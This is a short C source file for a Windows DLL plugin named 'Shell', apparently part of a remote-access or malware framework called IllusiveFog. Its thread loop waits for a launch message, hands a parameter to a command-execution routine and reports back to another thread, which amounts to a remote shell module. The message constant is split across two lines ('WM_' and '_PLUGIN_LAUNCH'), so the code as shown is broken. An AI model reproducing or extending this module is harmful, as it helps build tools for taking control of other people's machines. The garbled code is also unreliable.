#include "Shell.h"

__declspec(dllexport)void re( HANDLE localevent) 
{

	MSG msg;
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(localevent);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_
			_PLUGIN_LAUNCH) {

			Pplugin_param plugin_param = (Pplugin_param)msg.lParam;

		
			command_exec(plugin_param->param, plugin_param->reporter_threadid, plugin_param->reporter_event);
			SetEvent(localevent);
			ResetEvent(localevent);
			continue;
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {
			ExitThread(0);
		}
	}
}
BOOL  DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

